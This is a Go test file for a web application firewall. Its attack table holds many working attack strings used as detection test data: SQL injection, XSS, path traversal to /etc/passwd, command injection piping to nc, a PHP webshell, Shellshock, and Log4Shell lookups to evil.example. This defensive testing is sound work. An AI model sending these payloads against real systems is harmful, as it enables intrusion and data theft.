package cmd

import (
	"fmt"
	"io"
	"math/rand/v2"
	"net/http"
	"net/http/httptest"
	"sort"
	"strings"
	"testing"
)

type wafCase struct {
	name   string
	method string
	target string // path and query, as sent
	hdr    map[string]string
	body   string
	ct     string
	want   []string // rule IDs that must match
	level  int      // 0 = 1
}

func (c wafCase) request() (*http.Request, []byte, bool) {
	method := c.method
	if method == "" {
		method = "GET"
	}
	var r *http.Request
	if c.body != "" {
		r = httptest.NewRequest(method, "http://x.test"+c.target, strings.NewReader(c.body))
		if c.ct != "" {
			r.Header.Set("Content-Type", c.ct)
		}
	} else {
		r = httptest.NewRequest(method, "http://x.test"+c.target, nil)
	}
	for k, v := range c.hdr {
		r.Header.Set(k, v)
	}
	form := c.ct == "application/x-www-form-urlencoded"
	return r, []byte(c.body), form
}

func wafHits(t testing.TB, level int, c wafCase) (wafVerdict, *wafPolicy) {
	t.Helper()
	p, err := newWAFPolicy(&GatewayWAF{Mode: "detect", Level: level, Threshold: 100})
	if err != nil {
		t.Fatal(err)
	}
	r, body, _ := c.request()
	form, ok := p.wantBody(r) // as the gateway decides which bodies are read
	if !ok {
		body = nil
	}
	return p.inspect(r, "198.51.100.7", body, form), p
}

func hasID(v wafVerdict, id string) bool {
	for _, x := range v.ids[:v.n] {
		if x == id {
			return true
		}
	}
	return false
}

var wafAttacks = []wafCase{
	{name: "union select", target: "/search?q=1'+UNION+SELECT+username,password+FROM+users--", want: []string{"ZW-942100"}},
	{name: "union with comment", target: "/?id=1+union/**/select+1,2", want: []string{"ZW-942100"}},
	{name: "mysql executable comment", target: "/?id=1+/*!50000union*/+select+1", want: []string{"ZW-942100"}},
	{name: "double-encoded union", target: "/?id=1%2520union%2520select%25201", want: []string{"ZW-942100"}},
	{name: "uppercase mix", target: "/?id=1+UnIoN+aLl+SeLeCt+1", want: []string{"ZW-942100"}},
	{name: "quote tautology", target: "/?u=admin'+or+'1'%3D'1", want: []string{"ZW-942110"}},
	{name: "quote tautology no spaces", target: "/?u=admin'or'1'%3D'1", want: []string{"ZW-942110"}},
	{name: "stacked drop", target: "/?q=x';+DROP+TABLE+users;--", want: []string{"ZW-942130"}},
	{name: "time based", target: "/?id=1+AND+SLEEP(5)", want: []string{"ZW-942150"}},
	{name: "information schema", target: "/?id=1+union+select+table_name+from+information_schema.tables", want: []string{"ZW-942100", "ZW-942150"}},
	{name: "numeric tautology", target: "/?id=1+or+1%3D1", want: []string{"ZW-942120"}, level: 2},
	{name: "sqli in json body", method: "POST", target: "/login", ct: "application/json", body: `{"user":"x' OR '1'='1","pass":"y"}`, want: []string{"ZW-942110"}},
	{name: "sqli in form body", method: "POST", target: "/login", ct: "application/x-www-form-urlencoded", body: "user=admin%27+or+%271%27%3D%271&pass=x", want: []string{"ZW-942110"}},
	{name: "sqli in cookie", target: "/", hdr: map[string]string{"Cookie": "id=1' union select 1,2--"}, want: []string{"ZW-942100"}},
	{name: "script tag", target: "/?q=<script>alert(1)</script>", want: []string{"ZW-941100"}},
	{name: "encoded script tag", target: "/?q=%3Cscript%3Ealert(1)%3C/script%3E", want: []string{"ZW-941100"}},
	{name: "event handler", target: `/?q="><img+src%3Dx+onerror%3Dalert(1)>`, want: []string{"ZW-941110"}},
	{name: "javascript uri", target: "/?u=javascript:alert(1)", want: []string{"ZW-941120"}},
	{name: "iframe", target: "/?u=<iframe+src%3D//evil.example>", want: []string{"ZW-941130"}},
	{name: "svg onload", target: "/?u=<svg/onload%3Dalert(1)>", want: []string{"ZW-941110", "ZW-941130"}},
	{name: "xss in json body", method: "POST", target: "/c", ct: "application/json", body: `{"c":"<script>x()</script>"}`, want: []string{"ZW-941100"}},
	{name: "traversal", target: "/?f=../../../etc/passwd", want: []string{"ZW-930100", "ZW-930110"}},
	{name: "encoded traversal", target: "/?f=..%252f..%252fetc%252fpasswd", want: []string{"ZW-930100", "ZW-930110"}},
	{name: "windows traversal", target: `/?f=..%5c..%5cwindows%5cwin.ini`, want: []string{"ZW-930100", "ZW-930110"}},
	{name: "php wrapper", target: "/?f=php://filter/read=convert.base64-encode/resource=index.php", want: []string{"ZW-930120"}},
	{name: "dotenv", target: "/.env", want: []string{"ZW-930110"}},
	{name: "command after semicolon", target: "/?cmd=x;cat+/etc/passwd", want: []string{"ZW-932100", "ZW-930110"}},
	{name: "command substitution", target: "/?c=$(whoami)", want: []string{"ZW-932100"}},
	{name: "backtick", target: "/?c=%60id%60", want: []string{"ZW-932100"}},
	{name: "pipe", target: "/?c=a|nc+10.0.0.1+4444", want: []string{"ZW-932100"}},
	{name: "shell path", target: "/?c=/bin/bash+-c+id", want: []string{"ZW-932110"}},
	{name: "php code", method: "POST", target: "/u", ct: "text/plain", body: `<?php system($_GET['x']); ?>`, want: []string{"ZW-932120"}},
	{name: "dangerous function", target: "/?c=eval(base64_decode($_POST[x]))", want: []string{"ZW-932130"}, level: 2},
	{name: "shellshock", target: "/", hdr: map[string]string{"User-Agent": "() { :;}; /bin/cat /etc/passwd"}, want: []string{"ZW-932150"}},
	{name: "shellshock in cookie", target: "/", hdr: map[string]string{"Cookie": "a=() { :; }; echo"}, want: []string{"ZW-932150"}},
	{name: "log4shell ua", target: "/", hdr: map[string]string{"User-Agent": "${jndi:ldap://evil.example/a}"}, want: []string{"ZW-944100"}},
	{name: "log4shell obfuscated", target: "/", hdr: map[string]string{"X-Api-Version": "${${lower:j}ndi:ldap://evil/a}"}, want: []string{"ZW-944100"}},
	{name: "log4shell in query", target: "/?x=${jndi:rmi://evil/a}", want: []string{"ZW-944100"}},
	{name: "log4shell encoded", target: "/?x=%24%7Bjndi%3Aldap%3A%2F%2Fevil%2Fa%7D", want: []string{"ZW-944100"}},
	{name: "spring4shell", method: "POST", target: "/", ct: "application/x-www-form-urlencoded", body: "class.module.classLoader.resources.context.parent.pipeline.first.pattern=x", want: []string{"ZW-944110"}},
	{name: "java serialized", method: "POST", target: "/", ct: "text/plain", body: "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA", want: []string{"ZW-944110"}},
	{name: "xxe", method: "POST", target: "/x", ct: "application/xml", body: `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`, want: []string{"ZW-946100", "ZW-930110"}},
	{name: "metadata", target: "/?url=http://169.254.169.254/latest/meta-data/", want: []string{"ZW-934100"}},
	{name: "gopher", target: "/?url=gopher://127.0.0.1:6379/_", want: []string{"ZW-934110"}},
	{name: "internal url", target: "/?url=http://192.168.1.10/admin", want: []string{"ZW-934120"}, level: 2},
	{name: "scanner ua", target: "/", hdr: map[string]string{"User-Agent": "sqlmap/1.7.2#stable (https://sqlmap.org)"}, want: []string{"ZW-913100"}},
	{name: "probe path", target: "/wp-login.php", want: []string{"ZW-913110"}, level: 2},
	{name: "trace", method: "TRACE", target: "/", want: []string{"ZW-920110"}},
	{name: "unknown method", method: "BREW", target: "/", want: []string{"ZW-920100"}},
	{name: "httpoxy", target: "/", hdr: map[string]string{"Proxy": "http://evil.example:8080"}, want: []string{"ZW-920200"}},
	{name: "nul byte", target: "/?q=a%00b", want: []string{"ZW-920170"}},
	{name: "range flood", target: "/", hdr: map[string]string{"Range": "bytes=" + strings.Repeat("0-,", 20) + "0-"}, want: []string{"ZW-920190"}},
	{name: "long uri", target: "/?q=" + strings.Repeat("a", 9000), want: []string{"ZW-920130"}},
}

var wafBenign = []wafCase{
	{name: "plain search", target: "/search?q=how+to+select+the+best+option+from+a+list"},
	{name: "word union", target: "/?q=union+station+timetable"},
	{name: "apostrophe name", target: "/?name=O%27Brien&city=St.+John%27s"},
	{name: "ampersand text", target: "/?q=rock+%26+roll+and+fish+%26+chips"},
	{name: "contraction", target: "/?comment=don%27t+do+it+or+else"},
	{name: "product listing", target: "/products?id=42&sort=price&order=asc&page=3"},
	{name: "rest path", target: "/api/v1/users/123/profile"},
	{name: "uuid path", target: "/orders/3f2b8c1e-9d4a-4e0b-8f3c-1a2b3c4d5e6f/items"},
	{name: "semicolon list", target: "/?tags=a;b;c&x=1"},
	{name: "json body", method: "POST", target: "/posts", ct: "application/json",
		body: `{"title":"Hello, world","body":"This is a test; with a semicolon | and a pipe, plus 'quotes' and \"more\".","tags":["go","web"]}`},
	{name: "json with prose about sql", method: "POST", target: "/posts", ct: "application/json",
		body: `{"body":"Use the select element to pick one option. A reunion is a gathering."}`},
	{name: "form body", method: "POST", target: "/contact", ct: "application/x-www-form-urlencoded",
		body: "name=John+Smith&message=Hi+there%21+I+love+SELECT+statements+and+job+union+news"},
	{name: "cookie", target: "/", hdr: map[string]string{"Cookie": "session=Zm9vYmFyYmF6; theme=dark; lang=en-US"}},
	{name: "browser ua", target: "/", hdr: map[string]string{"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36",
		"Accept": "text/html,application/xhtml+xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Referer": "https://example.com/a?b=c"}},
	{name: "redirect url", target: "/login?next=https%3A%2F%2Fexample.com%2Fdash%3Ftab%3D1"},
	{name: "email", target: "/?email=o%27neil%40example.com"},
	{name: "java docs path", target: "/docs/java.lang.String"},
	{name: "javascript word", target: "/?q=learn+javascript+basics"},
	{name: "base64 token", target: "/?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U"},
	{name: "date range", target: "/report?from=2024-01-01&to=2024-12-31"},
	{name: "math", target: "/?q=2%2B2%3D4"},
	{name: "windows path text", target: "/?q=C%3A%5CUsers%5Calice%5Cdocs"},
	{name: "dotted version", target: "/download/app-1.2.3.tar.gz"},
	{name: "image upload headers", method: "PUT", target: "/img/1.png", ct: "image/png", body: "\x89PNG\r\n\x1a\n select union ; cat"},
	{name: "put", method: "PUT", target: "/things/7", ct: "application/json", body: `{"name":"x"}`},
	{name: "options", method: "OPTIONS", target: "/api"},
	{name: "patch", method: "PATCH", target: "/things/7", ct: "application/json", body: `{"n":1}`},
	{name: "delete", method: "DELETE", target: "/things/7"},
}

func TestWAFAttacksDetected(t *testing.T) {
	for _, c := range wafAttacks {
		level := max(c.level, 1)
		v, _ := wafHits(t, level, c)
		for _, id := range c.want {
			if !hasID(v, id) {
				t.Errorf("%s: %s not detected (hits %v, score %d)", c.name, id, v.ids[:v.n], v.score)
			}
		}
	}
}

func TestWAFBenignTrafficPasses(t *testing.T) {
	for _, level := range []int{1, 2} {
		for _, c := range wafBenign {
			v, _ := wafHits(t, level, c)
			if level == 1 && v.n != 0 || v.score >= 5 {
				t.Errorf("level %d: %s: false positive %v (score %d)", level, c.name, v.ids[:v.n], v.score)
			}
		}
	}
}

func TestWAFLevelsAndExclusions(t *testing.T) {
	c := wafCase{target: "/?id=1+or+1%3D1"}
	if v, _ := wafHits(t, 1, c); v.n != 0 {
		t.Errorf("a level 2 rule fired at level 1: %v", v.ids[:v.n])
	}
	if v, _ := wafHits(t, 2, c); !hasID(v, "ZW-942120") {
		t.Errorf("level 2 misses its rule")
	}
	// Exclusions by ID and by group.
	for _, ex := range [][]string{{"ZW-941100"}, {"xss"}} {
		p, err := newWAFPolicy(&GatewayWAF{Mode: "block", Exclude: ex})
		if err != nil {
			t.Fatal(err)
		}
		r := httptest.NewRequest("GET", "http://x.test/?q=<script>alert(1)</script>", nil)
		if v := p.inspect(r, "10.0.0.1", nil, false); p.action(&v) != wafPass {
			t.Errorf("exclusion %v did not exclude: %v", ex, v.ids[:v.n])
		}
	}
	if !wafKnownExclusion("ZW-942100") || !wafKnownExclusion("sqli") || wafKnownExclusion("ZW-000000") || wafKnownExclusion("nonsense") {
		t.Error("wafKnownExclusion")
	}
}

func TestWAFScoringAndModes(t *testing.T) {
	warn := httptest.NewRequest("GET", "http://x.test/?u=javascript:x", nil) // one error-level match (4)
	crit := httptest.NewRequest("GET", "http://x.test/?q=<script>", nil)     // critical (5)
	for _, c := range []struct {
		mode string
		req  *http.Request
		want wafAction
	}{
		{"block", warn, wafLogged},
		{"block", crit, wafBlocked},
		{"detect", crit, wafWouldBlock},
		{"detect", warn, wafLogged},
	} {
		p, _ := newWAFPolicy(&GatewayWAF{Mode: c.mode})
		if v := p.inspect(c.req, "10.0.0.1", nil, false); p.action(&v) != c.want {
			t.Errorf("%s %s: action %d, want %d", c.mode, c.req.URL, p.action(&v), c.want)
		}
	}
	// A lower threshold blocks sooner.
	p, _ := newWAFPolicy(&GatewayWAF{Mode: "block", Threshold: 4})
	if v := p.inspect(warn, "10.0.0.1", nil, false); p.action(&v) != wafBlocked {
		t.Error("threshold 4 must block a score of 4")
	}
	if p, err := newWAFPolicy(&GatewayWAF{Mode: "off"}); p != nil || err != nil {
		t.Error("mode off compiles to no policy")
	}
}

func TestWAFCustomRules(t *testing.T) {
	p, err := newWAFPolicy(&GatewayWAF{Mode: "block", Rules: []GatewayWAFRule{
		{ID: "office", Target: "ip", Op: "cidr", Value: "203.0.113.0/24", Action: "allow"},
		{ID: "bad-agent", Target: "user_agent", Op: "contains", Value: "EvilBot", Action: "deny"},
		{ID: "admin-path", Target: "path", Op: "prefix", Value: "/admin", Action: "score", Score: 3},
		{ID: "token", Target: "header:X-Token", Op: "regex", Value: `^[a-z]{3}-\d+$`, Not: true, Action: "score", Score: 5},
		{ID: "old-api", Target: "arg:v", Op: "eq", Value: "1", Action: "log"},
	}})
	if err != nil {
		t.Fatal(err)
	}
	run := func(ip, target string, hdr map[string]string) (wafAction, wafVerdict) {
		r := httptest.NewRequest("GET", "http://x.test"+target, nil)
		for k, v := range hdr {
			r.Header.Set(k, v)
		}
		v := p.inspect(r, ip, nil, false)
		return p.action(&v), v
	}
	if a, _ := run("198.51.100.1", "/", map[string]string{"User-Agent": "xevilbotx"}); a != wafBlocked {
		t.Errorf("deny rule: %d", a)
	}
	if a, v := run("203.0.113.9", "/?q=<script>", map[string]string{"User-Agent": "EvilBot"}); a != wafPass || !v.allow {
		t.Errorf("an allow rule must stand the WAF aside: %d", a)
	}
	if a, v := run("198.51.100.1", "/admin/x", map[string]string{"X-Token": "abc-12"}); a != wafLogged || v.score != 3 {
		t.Errorf("score rule: %d score %d", a, v.score)
	}
	if a, _ := run("198.51.100.1", "/admin/x", map[string]string{"X-Token": "bad token!"}); a != wafBlocked {
		t.Errorf("3 + 5 must block: %d", a)
	}
	if a, v := run("198.51.100.1", "/?v=1", map[string]string{"X-Token": "abc-1"}); a != wafLogged || v.score != 0 || v.n != 1 {
		t.Errorf("log rule: %d %+v", a, v)
	}
}

func TestWAFNormalizeAndPrefilter(t *testing.T) {
	sc := new(wafScratch)
	for in, want := range map[string]string{
		"UNION%20SELECT":        "union select",
		"a%2520b":               "a b",
		"x+y":                   "x y",
		"  a \t\n b  ":          "a b",
		"un/**/ion":             "un ion",
		"/*!50000union*/select": " union select",
		"a%zzb":                 "a%zzb",
		"100%":                  "100%",
	} {
		got := string(normalizeOne(sc, nil, []byte(in), true))
		if strings.TrimSpace(got) != strings.TrimSpace(want) {
			t.Errorf("normalize(%q) = %q, want %q", in, got, want)
		}
	}
	// The prefilter agrees with strings.Contains on random text.
	e := wafEng()
	var naive []acNeedle
	for i, d := range wafCatalog {
		for _, n := range d.Needles {
			naive = append(naive, acNeedle{n, i})
		}
	}
	rng := rand.New(rand.NewPCG(1, 2))
	alphabet := "abcdefghijklmnopqrstuvwxyz0123456789 ;|&`$(){}<>'\"/.:=-_%\\@*"
	for i := 0; i < 3000; i++ {
		b := make([]byte, rng.IntN(60))
		for j := range b {
			b[j] = alphabet[rng.IntN(len(alphabet))]
		}
		if i%3 == 0 && len(naive) > 0 { // plant a literal
			n := naive[rng.IntN(len(naive))]
			b = append(b, n.text...)
		}
		var want uint64
		for _, n := range naive {
			if strings.Contains(string(b), n.text) {
				want |= 1 << uint(n.rule)
			}
		}
		if got := acScan(e.ac, b); got != want {
			t.Fatalf("prefilter disagrees on %q: got %b want %b", b, got, want)
		}
	}
}

func TestWAFCatalogIntegrity(t *testing.T) {
	e := wafEng()
	seen := map[string]bool{}
	var ids []string
	for _, r := range e.rules {
		if seen[r.ID] {
			t.Errorf("duplicate rule ID %s", r.ID)
		}
		seen[r.ID] = true
		ids = append(ids, r.ID)
		if r.Level < 1 || r.Level > 3 || r.Score < 2 || r.Score > 5 || r.Msg == "" {
			t.Errorf("%s: level %d score %d msg %q", r.ID, r.Level, r.Score, r.Msg)
		}
		if (r.re == nil) != (r.Targets == 0) {
			t.Errorf("%s: a rule is implemented either as a regex on request parts or in code", r.ID)
		}
		for _, n := range r.Needles {
			if n != strings.ToLower(n) || n == "" {
				t.Errorf("%s: needle %q must be lower case", r.ID, n)
			}
		}
	}
	if !sort.StringsAreSorted(ids[:0]) || len(ids) > 64 {
		t.Error("catalog size")
	}
	// Every rule's own needles can reach it: the prefilter must report each needle's rule.
	for i, r := range e.rules {
		for _, n := range r.Needles {
			if acScan(e.ac, []byte(n))&(1<<uint(i)) == 0 {
				t.Errorf("%s: needle %q does not trigger its rule", r.ID, n)
			}
		}
	}
	if got := len(wafRuleCatalog()); got != len(wafCatalog) {
		t.Errorf("rule listing has %d rules", got)
	}
}

func TestWAFBodyReplay(t *testing.T) {
	p, _ := newWAFPolicy(&GatewayWAF{Mode: "block"})
	for _, size := range []int{10, 8192, 20000} {
		payload := strings.Repeat("a", size)
		r := httptest.NewRequest("POST", "http://x.test/", strings.NewReader(payload))
		r.ContentLength = int64(size)
		body, release := p.readBody(r)
		if len(body) != min(size, 8192) {
			t.Errorf("size %d: inspected %d bytes", size, len(body))
		}
		got := new(strings.Builder)
		if _, err := io.Copy(got, r.Body); err != nil {
			t.Fatal(err)
		}
		if got.String() != payload {
			t.Errorf("size %d: the upstream would receive %d bytes of %d", size, got.Len(), size)
		}
		release()
	}
	// Chunked.
	r := httptest.NewRequest("POST", "http://x.test/", strings.NewReader(strings.Repeat("b", 30000)))
	r.ContentLength = -1
	body, release := p.readBody(r)
	defer release()
	got := new(strings.Builder)
	io.Copy(got, r.Body)
	if len(body) != 8192 || got.Len() != 30000 {
		t.Errorf("chunked: inspected %d, forwarded %d", len(body), got.Len())
	}
}

func TestWAFWantBody(t *testing.T) {
	p, _ := newWAFPolicy(&GatewayWAF{Mode: "block"})
	for ct, want := range map[string]bool{"application/json": true, "application/json; charset=utf-8": true, "": true, "text/plain": true,
		"application/xml": true, "application/ld+json": true, "multipart/form-data; boundary=x": true, "application/x-www-form-urlencoded": true,
		"image/png": false, "application/octet-stream": false, "application/grpc": false, "text/event-stream": false, "video/mp4": false} {
		r := httptest.NewRequest("POST", "http://x.test/", strings.NewReader("x"))
		if ct != "" {
			r.Header.Set("Content-Type", ct)
		}
		if _, ok := p.wantBody(r); ok != want {
			t.Errorf("content type %q: inspect=%v", ct, ok)
		}
	}
	r := httptest.NewRequest("POST", "http://x.test/", strings.NewReader("x"))
	r.Header.Set("Upgrade", "websocket")
	if _, ok := p.wantBody(r); ok {
		t.Error("an upgrade request has no inspectable body")
	}
	skip, _ := newWAFPolicy(&GatewayWAF{Mode: "block", SkipBody: true})
	if _, ok := skip.wantBody(httptest.NewRequest("POST", "http://x.test/", strings.NewReader("x"))); ok {
		t.Error("skip_body")
	}
}

func FuzzWAFInspect(f *testing.F) {
	for _, c := range wafAttacks {
		f.Add(c.target, c.body)
	}
	p, _ := newWAFPolicy(&GatewayWAF{Mode: "block", Level: 3})
	f.Fuzz(func(t *testing.T, target, body string) {
		r, err := http.NewRequest("POST", "http://x.test/", strings.NewReader(body))
		if err != nil {
			return
		}
		r.URL.Path, r.URL.RawQuery = target, target
		r.Header.Set("User-Agent", target)
		r.Header.Set("Cookie", "a="+target)
		v := p.inspect(r, "10.0.0.1", []byte(body), false)
		_ = fmt.Sprint(v.score)
	})
}

func BenchmarkWAFInspect(b *testing.B) {
	run := func(b *testing.B, level int, c wafCase) {
		p, _ := newWAFPolicy(&GatewayWAF{Mode: "block", Level: level})
		r, body, form := c.request()
		b.ReportAllocs()
		b.ResetTimer()
		b.RunParallel(func(pb *testing.PB) {
			for pb.Next() {
				p.inspect(r, "10.0.0.1", body, form)
			}
		})
	}
	typical := wafCase{target: "/products?id=42&sort=price&order=asc&page=3&q=blue+shoes", hdr: map[string]string{
		"User-Agent":      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36",
		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://example.com/shop",
		"Cookie": "session=Zm9vYmFyYmF6MTIzNDU2; theme=dark; lang=en-US; _ga=GA1.2.123456789.1700000000"}}
	b.Run("typical-L1", func(b *testing.B) { run(b, 1, typical) })
	b.Run("typical-L3", func(b *testing.B) { run(b, 3, typical) })
	json := wafCase{method: "POST", target: "/api/orders", ct: "application/json", hdr: typical.hdr,
		body: `{"customer":{"name":"Alice Smith","email":"alice@example.com"},"items":[{"sku":"A-100","qty":2},{"sku":"B-200","qty":1}],"note":"Leave at the door; ring twice | thanks"}`}
	b.Run("json-post-L1", func(b *testing.B) { run(b, 1, json) })
	attack := wafCase{target: "/search?q=1'+UNION+SELECT+username,password+FROM+users--", hdr: typical.hdr}
	b.Run("attack-L1", func(b *testing.B) { run(b, 1, attack) })
}

// A hand-written matcher must agree with the expression it replaces.
func TestWAFMatchersAgreeWithRegex(t *testing.T) {
	e := wafEng()
	rng := rand.New(rand.NewPCG(7, 9))
	words := []string{"cat", "ls", "id", "whoami", "python3", "sh", "bash", "category", "idle", "x", "curl", "rm", "nc", "ping", "echo", "hello", "dig"}
	seps := []string{";", "|", "||", "&&", "&", "`", "$(", "$", " ", "  ", "-", ")", "<", "\x01", "/", "'", ":"}
	for id, fn := range wafMatchers {
		re := e.rules[e.index[id]].re
		for i := 0; i < 20000; i++ {
			var sb strings.Builder
			for n := rng.IntN(6); n >= 0; n-- {
				sb.WriteString(seps[rng.IntN(len(seps))])
				sb.WriteString(words[rng.IntN(len(words))])
			}
			text := strings.ReplaceAll(sb.String(), "\\x01", "\x01")
			text = strings.Join(strings.Fields(text+" "), " ") // normalized: white space collapsed
			if fn([]byte(text)) != re.Match([]byte(text)) {
				t.Fatalf("%s: matcher and regex disagree on %q (matcher %v)", id, text, fn([]byte(text)))
			}
		}
	}
}
